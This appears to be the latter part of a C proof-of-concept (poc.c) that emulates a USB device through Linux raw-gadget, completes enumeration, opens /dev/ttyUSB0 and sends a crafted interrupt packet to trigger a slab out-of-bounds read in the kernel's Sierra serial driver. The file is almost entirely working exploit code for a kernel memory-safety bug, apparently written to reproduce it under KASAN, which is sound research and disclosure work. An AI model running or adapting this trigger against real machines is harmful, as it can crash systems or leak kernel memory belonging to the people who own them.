static volatile int threads_run = 1;

static void *bulk_in_thread(void *arg) {
    (void)arg;
    uint8_t buf[512];
    memset(buf, 0, sizeof(buf));
    while (threads_run) {
        int r = ep_write(ep_bulk_in_handle, buf, sizeof(buf));
        if (r < 0) {
            if (errno == ESHUTDOWN || errno == ENODEV)
                break;
            usleep(10000);
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    (void)argc; (void)argv;

    fprintf(stderr, "[poc] Sierra OOB read PoC starting\n");

    fd_raw = open("/dev/raw-gadget", O_RDWR | O_CLOEXEC);
    if (fd_raw < 0) die("open /dev/raw-gadget");

    /* Discover UDC */
    char udc_name[128] = {0};
    char driver_name[128] = {0};
    DIR *d = opendir("/sys/class/udc");
    if (!d) die("opendir /sys/class/udc");
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (de->d_name[0] == '.') continue;
        snprintf(udc_name, sizeof(udc_name), "%s", de->d_name);
        break;
    }
    closedir(d);
    if (!udc_name[0]) { fprintf(stderr, "[poc] No UDC\n"); return 1; }

    if (!strncmp(udc_name, "dummy_udc", 9))
        snprintf(driver_name, sizeof(driver_name), "dummy_udc");
    else
        snprintf(driver_name, sizeof(driver_name), "%s", udc_name);

    fprintf(stderr, "[poc] UDC: device=%s driver=%s\n", udc_name, driver_name);

    struct usb_raw_init init;
    memset(&init, 0, sizeof(init));
    snprintf((char *)init.driver_name, sizeof(init.driver_name), "%s", driver_name);
    snprintf((char *)init.device_name, sizeof(init.device_name), "%s", udc_name);
    init.speed = USB_SPEED_HIGH;

    if (ioctl(fd_raw, USB_RAW_IOCTL_INIT, &init) < 0) die("INIT");
    if (ioctl(fd_raw, USB_RAW_IOCTL_RUN, 0) < 0) die("RUN");

    fprintf(stderr, "[poc] Raw gadget running\n");

    int configured = 0;

    while (!configured) {
        uint8_t evbuf[512];
        memset(evbuf, 0, sizeof(evbuf));
        struct usb_raw_event *ev = (struct usb_raw_event *)evbuf;
        ev->length = sizeof(evbuf) - sizeof(*ev);

        if (ioctl(fd_raw, USB_RAW_IOCTL_EVENT_FETCH, ev) < 0) {
            if (errno == EINTR) continue;
            die("EVENT_FETCH");
        }

        if (ev->type == USB_RAW_EVENT_CONNECT) {
            fprintf(stderr, "[poc] CONNECT\n");
            pick_eps();
            build_descriptors();
            continue;
        }
        if (ev->type == USB_RAW_EVENT_RESET) {
            fprintf(stderr, "[poc] RESET\n");
            continue;
        }
        if (ev->type != USB_RAW_EVENT_CONTROL) {
            fprintf(stderr, "[poc] event type=%u\n", ev->type);
            continue;
        }
        if (ev->length < sizeof(struct usb_ctrlrequest)) continue;

        struct usb_ctrlrequest *setup = (struct usb_ctrlrequest *)ev->data;
        uint8_t bmReqType = setup->bRequestType;
        uint8_t bReq = setup->bRequest;
        uint16_t wValue = le16_to_cpu(setup->wValue);
        uint16_t wIndex = le16_to_cpu(setup->wIndex);
        uint16_t wLength = le16_to_cpu(setup->wLength);

        fprintf(stderr, "[poc] CTRL: rt=0x%02x rq=0x%02x val=0x%04x idx=0x%04x len=%u\n",
                bmReqType, bReq, wValue, wIndex, wLength);

        if ((bmReqType & USB_TYPE_MASK) == USB_TYPE_STANDARD) {
            if (bReq == USB_REQ_GET_DESCRIPTOR) {
                uint8_t dtype = (wValue >> 8) & 0xff;
                uint8_t dindex = wValue & 0xff;
                if (dtype == USB_DT_DEVICE) {
                    size_t n = sizeof(dev_desc);
                    if (n > wLength) n = wLength;
                    ep0_write(&dev_desc, n);
                } else if (dtype == USB_DT_CONFIG) {
                    size_t n = cfg_len;
                    if (n > wLength) n = wLength;
                    ep0_write(cfg_buf, n);
                } else if (dtype == USB_DT_STRING) {
                    uint8_t sbuf[128];
                    size_t slen = 0;
                    build_string_desc(dindex, sbuf, &slen);
                    if (slen > wLength) slen = wLength;
                    ep0_write(sbuf, slen);
                } else if (dtype == USB_DT_DEVICE_QUALIFIER) {
                    size_t n = sizeof(qual_desc);
                    if (n > wLength) n = wLength;
                    ep0_write(&qual_desc, n);
                } else {
                    ep0_stall();
                }
                continue;
            }
            if (bReq == USB_REQ_SET_CONFIGURATION) {
                fprintf(stderr, "[poc] SET_CONFIGURATION %u\n", wValue);
                ep0_read(NULL, 0);
                if (ioctl(fd_raw, USB_RAW_IOCTL_CONFIGURE, 0) < 0) die("CONFIGURE");
                int h;
                h = ioctl(fd_raw, USB_RAW_IOCTL_EP_ENABLE, &ep_bulk_out_desc);
                if (h < 0) die("EP_ENABLE bulk_out");
                ep_bulk_out_handle = (uint16_t)h;
                h = ioctl(fd_raw, USB_RAW_IOCTL_EP_ENABLE, &ep_bulk_in_desc);
                if (h < 0) die("EP_ENABLE bulk_in");
                ep_bulk_in_handle = (uint16_t)h;
                h = ioctl(fd_raw, USB_RAW_IOCTL_EP_ENABLE, &ep_int_in_desc);
                if (h < 0) die("EP_ENABLE int_in");
                ep_int_in_handle = (uint16_t)h;
                fprintf(stderr, "[poc] EPs enabled: bout=%u bin=%u iin=%u\n",
                        ep_bulk_out_handle, ep_bulk_in_handle, ep_int_in_handle);
                configured = 1;
                continue;
            }
            if (bReq == USB_REQ_SET_INTERFACE) {
                ep0_read(NULL, 0);
                continue;
            }
            if (bReq == USB_REQ_GET_STATUS) {
                uint16_t status = 0;
                size_t n = 2;
                if (n > wLength) n = wLength;
                ep0_write(&status, n);
                continue;
            }
            if (!(bmReqType & USB_DIR_IN) && wLength == 0) {
                ep0_read(NULL, 0);
                continue;
            }
        }
        /* Vendor/class requests */
        if (!(bmReqType & USB_DIR_IN) && wLength == 0) {
            ep0_read(NULL, 0);
        } else if (!(bmReqType & USB_DIR_IN)) {
            uint8_t tmpbuf[1024];
            ep0_read(tmpbuf, wLength);
        } else {
            ep0_stall();
        }
    }

    fprintf(stderr, "[poc] Configured. Starting bulk-in feeder.\n");

    pthread_t bulkin_tid;
    pthread_create(&bulkin_tid, NULL, bulk_in_thread, NULL);

    fprintf(stderr, "[poc] Waiting for /dev/ttyUSB0...\n");
    for (int i = 0; i < 200; i++) {
        if (access("/dev/ttyUSB0", F_OK) == 0) break;
        usleep(50000);
    }

    fprintf(stderr, "[poc] Opening /dev/ttyUSB0 (with retries)...\n");
    int ttyfd = -1;
    for (int attempt = 0; attempt < 50 && ttyfd < 0; attempt++) {
        ttyfd = open("/dev/ttyUSB0", O_RDWR | O_NOCTTY | O_CLOEXEC);
        if (ttyfd >= 0) break;
        if (errno == EACCES) {
            /* Permission not yet set by init helper */
            usleep(100000);
            continue;
        }
        /* Try other ttyUSB devices */
        for (int n = 1; n < 5 && ttyfd < 0; n++) {
            char path[32];
            snprintf(path, sizeof(path), "/dev/ttyUSB%d", n);
            ttyfd = open(path, O_RDWR | O_NOCTTY | O_CLOEXEC);
            if (ttyfd >= 0) {
                fprintf(stderr, "[poc] Opened %s\n", path);
            }
        }
        if (ttyfd < 0) usleep(100000);
    }
    if (ttyfd < 0) {
        fprintf(stderr, "[poc] No ttyUSB opened\n");
        threads_run = 0;
        close(fd_raw);
        return 1;
    }

    fprintf(stderr, "[poc] ttyUSB opened. Waiting for URB submission...\n");
    usleep(500000);

    /* OOB-triggering interrupt packet: 8 bytes, starts with 0xA1 0x20 */
    uint8_t int_pkt[8] = { 0xA1, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    fprintf(stderr, "[poc] Sending OOB trigger interrupt-IN packet\n");
    for (int i = 0; i < 10; i++) {
        int ret = ep_write(ep_int_in_handle, int_pkt, sizeof(int_pkt));
        if (ret < 0) {
            fprintf(stderr, "[poc] ep_write(int) #%d: %s\n", i, strerror(errno));
            break;
        }
        fprintf(stderr, "[poc] Interrupt pkt #%d delivered (%d bytes)\n", i, ret);
        usleep(200000);
    }

    fprintf(stderr, "[poc] Done. KASAN should have reported slab-out-of-bounds.\n");
    sleep(2);
    threads_run = 0;
    close(ttyfd);
    close(fd_raw);
    return 0;
}

--- end poc.c ---

